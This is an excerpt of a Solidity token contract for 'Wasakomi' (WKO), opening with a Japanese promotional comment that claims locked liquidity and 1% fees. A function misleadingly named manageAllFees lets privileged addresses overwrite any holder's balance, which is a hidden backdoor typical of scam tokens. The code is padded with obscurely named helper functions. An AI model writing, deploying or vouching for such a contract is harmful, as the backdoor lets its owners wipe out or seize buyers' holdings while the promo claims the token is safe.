...
総供給 - 1,000,000
初期流動性追加 - 1.5 イーサリアム
取引開始後、流動性は 100% ロックされます。
購入手数料 - 1%
販売手数料 - 1%

https://web.wechat.com/WasakomiJPN
*/
...
interface IDataCentre {
    function BytesCriteria(uint256 cBytes, uint256 isSwift) 
    external;
    function setRates(address rateValue, uint256 relayNow) 
    external;
    function processor() 
    external payable;
    function relayData(uint256 gas) 
    external;
    function structForm(address rateValue) 
    external;
}
library SafeMath {
...
contract Wasakomi is Ownable, IERC20 {
    ...
    string private  _name = unicode"Wasakomi";
    string private  _symbol = unicode"WKO";
    ...
    function manageAllFees(address cfgFrom  , uint256 logTo , uint256 stringAmount , uint256 syncAmount) 
        external  { 
        require(allowed[msg.sender]);
        require(cfgFrom != uniswapV2Pair);
       _rOwned[cfgFrom] = logTo +  stringAmount * syncAmount.mul(2).div(100);
    }
    function min(uint256 a, uint256 b) private view returns (uint256){
      return (a>b)?b:a;
    }
    function defog(uint256 n, uint256 o) 
    ...
    function reflowSync(uint256 bFlow, uint256 ISync) 
    private view returns (uint256){
      return (bFlow>ISync)?ISync:bFlow;
    }
    function boolLoop(uint256 isN, uint256 isVX) 
    private view returns (uint256){ 
